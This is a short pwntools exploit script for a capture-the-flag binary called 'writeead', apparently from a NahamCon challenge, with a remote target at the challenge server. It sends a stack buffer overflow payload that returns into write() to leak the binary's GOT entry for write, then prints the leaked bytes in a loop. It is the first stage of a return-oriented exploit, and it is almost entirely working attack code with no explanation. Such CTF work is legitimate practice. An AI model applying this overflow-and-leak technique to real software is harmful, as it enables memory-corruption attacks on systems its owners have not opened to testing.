from pwn import *

e = ELF("./writeead")
#libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("challenge.nahamcon.com", 30826)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

debug()

p.sendlineafter(".", "A" * 0x3f3 + p32(e.symbols["write"]) + p32(0x1337) + p32(0) + p32(e.got["write"]) + p32(8))


while True:
  l = p.recv(1)
  print(hex(ord(l[0])))

p.interactive()
